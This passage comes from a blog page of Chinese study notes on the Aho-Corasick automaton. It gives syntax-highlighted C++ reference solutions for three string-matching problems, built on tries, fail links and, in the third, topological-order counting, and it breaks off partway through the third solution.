class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000001</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">bool</span> b[maxn];</span><br><span class="line">string word,s;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    A *fail;</span><br><span class="line">    A *next[<span class="number">26</span>];</span><br><span class="line">    <span class="keyword">int</span> word;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">            next[i]=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fail=<span class="literal">NULL</span>; </span><br><span class="line">        word=<span class="number">0</span>;</span><br><span class="line">        num=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;node;</span><br><span class="line">node *root;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_word</span><span class="params">(<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=word.<span class="built_in">length</span>();</span><br><span class="line">    node *p=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=word[i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;next[k]==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            node *temp;</span><br><span class="line">            temp=<span class="keyword">new</span> node;</span><br><span class="line">            temp-&gt;<span class="built_in">a</span>();</span><br><span class="line">            p-&gt;next[k]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;next[k];    </span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;word=j;</span><br><span class="line">    p-&gt;num++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fail</span><span class="params">()</span></span>&#123;</span><br><span class="line">    queue&lt;node *&gt;q;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        node *p=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;next[i]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                node *t=p-&gt;next[i];</span><br><span class="line">                <span class="keyword">if</span>(p==root)&#123;</span><br><span class="line">                    t-&gt;fail=root;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    node *fafail=p-&gt;fail;</span><br><span class="line">                    <span class="keyword">while</span>(fafail!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(fafail-&gt;next[i]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                            t-&gt;fail=fafail-&gt;next[i];</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        fafail=fafail-&gt;fail;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(fafail==<span class="literal">NULL</span>)t-&gt;fail=root;</span><br><span class="line">                &#125;</span><br><span class="line">                q.<span class="built_in">push</span>(t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=s.<span class="built_in">length</span>();</span><br><span class="line">    node *p=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=s[i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>(p!=root&amp;&amp;p-&gt;next[k]==<span class="literal">NULL</span>)</span><br><span class="line">            p=p-&gt;fail;</span><br><span class="line">        p=p-&gt;next[k];</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">            p=root;</span><br><span class="line">        node *temp=p;</span><br><span class="line">        <span class="comment">//while(temp!=root)&#123;</span></span><br><span class="line">            <span class="keyword">if</span>(temp-&gt;word&amp;&amp;!b[temp-&gt;word])&#123;</span><br><span class="line">                b[temp-&gt;word]=<span class="number">1</span>;</span><br><span class="line">                ans+=temp-&gt;num;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">//    temp=temp-&gt;fail;</span></span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int c[10001];</span></span><br><span class="line"><span class="comment">int all=0;</span></span><br><span class="line"><span class="comment">void print()&#123;</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;=all;i++)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%c&quot;,b[i]+&#x27;a&#x27;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    cout&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">void dfs(node *t)&#123;</span></span><br><span class="line"><span class="comment">    if(t-&gt;word)print();</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;26;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(t-&gt;next[i]!=NULL)&#123;</span></span><br><span class="line"><span class="comment">            c[++all]=i;</span></span><br><span class="line"><span class="comment">            dfs(t-&gt;next[i]);</span></span><br><span class="line"><span class="comment">            all--;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3808.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="comment">//freopen(&quot;P3808.out&quot;,&quot;w&quot;,stdout);</span></span><br><span class="line">    root=<span class="keyword">new</span> node;</span><br><span class="line">    root-&gt;<span class="built_in">a</span>();</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;word;</span><br><span class="line">        <span class="built_in">insert_word</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//dfs(root);</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">fail</span>();</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;s)&#123;</span><br><span class="line">        ans=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">query</span>();</span><br><span class="line">        cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><p><img src="/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.png" alt="2"></p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> word;</span><br><span class="line">    A* fail;</span><br><span class="line">    A* next[<span class="number">26</span>];</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">aaa</span><span class="params">()</span></span>&#123;</span><br><span class="line">        word=<span class="number">0</span>;</span><br><span class="line">        fail=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">            next[i]=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;node;</span><br><span class="line">node *root;</span><br><span class="line">queue&lt;node*&gt;q;</span><br><span class="line">map&lt;string,<span class="keyword">int</span>&gt;tmap;</span><br><span class="line">string word[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">char</span> t[<span class="number">1000010</span>];</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    node *p=root;</span><br><span class="line">    <span class="keyword">int</span> len=word[x].<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=word[x][i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;next[k]==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            node *new_node=<span class="keyword">new</span> node;</span><br><span class="line">            new_node-&gt;<span class="built_in">aaa</span>();</span><br><span class="line">            p-&gt;next[k]=new_node;</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;next[k];</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;word=x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_fail</span><span class="params">()</span></span>&#123;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        node *p=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;next[i]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                node *k=p-&gt;next[i];</span><br><span class="line">                q.<span class="built_in">push</span>(k);</span><br><span class="line">                <span class="keyword">if</span>(p==root)&#123;</span><br><span class="line">                    k-&gt;fail=root;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    node *fafail=p-&gt;fail;</span><br><span class="line">                    <span class="keyword">while</span>(fafail!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(fafail-&gt;next[i]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                            k-&gt;fail=fafail-&gt;next[i];</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        fafail=fafail-&gt;fail;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(fafail==<span class="literal">NULL</span>)k-&gt;fail=root;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(t);</span><br><span class="line">    node *p=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=t[i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>(p-&gt;next[k]==<span class="literal">NULL</span>&amp;&amp;p!=root)p=p-&gt;fail;</span><br><span class="line">        p=p-&gt;next[k];</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="literal">NULL</span>)p=root;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            node *temp=p;</span><br><span class="line">            <span class="keyword">while</span>(temp!=root)&#123;</span><br><span class="line">                <span class="keyword">if</span>(temp-&gt;word)&#123;</span><br><span class="line">                    num[temp-&gt;word]++;</span><br><span class="line">                &#125;</span><br><span class="line">                temp=temp-&gt;fail;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp1</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(string a,string b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num[tmap[a]]==num[tmap[b]])<span class="keyword">return</span> tmap[a]&lt;tmap[b];</span><br><span class="line">    <span class="keyword">return</span> num[tmap[a]]&gt;num[tmap[b]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;in.txt&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n)&amp;&amp;n)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(num,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(num));</span><br><span class="line">        tmap.<span class="built_in">clear</span>();</span><br><span class="line">        root=<span class="keyword">new</span> node;</span><br><span class="line">        root-&gt;<span class="built_in">aaa</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            cin&gt;&gt;word[i];</span><br><span class="line">            tmap[word[i]]=i;</span><br><span class="line">            <span class="built_in">insert</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">build_fail</span>();</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,t);</span><br><span class="line">        <span class="built_in">query</span>();</span><br><span class="line">        <span class="built_in">sort</span>(word+<span class="number">1</span>,word+<span class="number">1</span>+n,cmp);</span><br><span class="line">        <span class="built_in">sort</span>(num+<span class="number">1</span>,num+<span class="number">1</span>+n,cmp1);</span><br><span class="line">        <span class="keyword">int</span> maxnum=num[<span class="number">1</span>];</span><br><span class="line">        cout&lt;&lt;maxnum&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num[i]==maxnum)&#123;</span><br><span class="line">                cout&lt;&lt;word[i]&lt;&lt;endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h2><p><img src="/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.png" alt="3"></p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">2e6</span> + <span class="number">5</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> word;<span class="keyword">int</span> deg,val;</span><br><span class="line">    node *fail , *next[<span class="number">26</span>];</span><br><span class="line">    <span class="built_in">node</span>() &#123;</span><br><span class="line">        word = deg = val = <span class="number">0</span>;fail = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">26</span>;i++)</span><br><span class="line">            next[i] = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;*ext=(node*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(node)*maxn),*root;</span><br><span class="line"></span><br><span class="line">queue&lt;node*&gt; Q;</span><br><span class="line"><span class="keyword">char</span> t[maxn], word[maxn];<span class="keyword">int</span> num[maxn],ans[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> node* <span class="title">Ot</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> *ext=<span class="built_in">node</span>(),ext++;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    node* p = root;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(word);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; len;i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> k = word[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;next[k] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            p-&gt;next[k] = <span class="built_in">Ot</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next[k];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!p-&gt;word) &#123;</span><br><span class="line">        p-&gt;word = x;</span><br><span class="line">    &#125;</span><br><span class="line">    num[x] = p-&gt;word;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_fail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++) <span class="keyword">if</span>(root-&gt;next[i]) root-&gt;next[i]-&gt;fail=root,Q.<span class="built_in">push</span>(root-&gt;next[i]); <span class="keyword">else</span> root-&gt;next[i]=root;</span><br><span class="line">    <span class="keyword">while</span> (!Q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        node* p = Q.<span class="built_in">front</span>();Q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="comment">// printf(&quot;%ld\n&quot;,p-root);</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">26</span>;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;next[i]) &#123;</span><br><span class="line">                p-&gt;next[i]-&gt;fail = p-&gt;fail-&gt;next[i],p-&gt;fail-&gt;next[i]-&gt;deg++;</span><br><span class="line">                <span class="keyword">if</span>(p-&gt;next[i]!=root) Q.<span class="built_in">push</span>(p-&gt;next[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> p-&gt;next[i] = p-&gt;fail-&gt;next[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(t);</span><br><span class="line">    <span class="comment">// printf(&quot;len:%d\n&quot;,len);</span></span><br><span class="line">    node* p = root;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; len;i++) &#123;</span><br><span class="line">        <span class="comment">// printf(&quot;i:%d p:%ld np:%ld\n&quot;,i,p-root,p-&gt;next[t[i]-&#x27;a&#x27;]);</span></span><br><span class="line">        <span class="keyword">int</span> k = t[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        p=p-&gt;next[k];p-&gt;val++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// puts(&quot;OUT&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">topo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(node *i=root;i&lt;ext;i++) <span class="keyword">if</span>(!i-&gt;deg) Q.<span class="built_in">push</span>(i);</span><br><span class="line">    <span class="keyword">while</span>(!Q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        node *p=Q.<span class="built_in">front</span>();Q.<span class="built_in">pop</span>();ans[p-&gt;word]=p-&gt;val;</span><br><span class="line">        <span class="comment">// printf(&quot;p:%ld\n&quot;,p-root);</span></span><br><span class="line">        <span class="keyword">if</span>(p!=root)&#123;</span><br><span class="line">            p-&gt;fail-&gt;val += p-&gt;val;</span><br><span class="line">            <span class="keyword">if</span>(--p-&gt;fail-&gt;deg==<span class="number">0</span>) Q.<span class="built_in">push</span>(p-&gt;fail);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);root=<span class="built_in">Ot</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n;i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, word);</span><br><span class="line">        <span 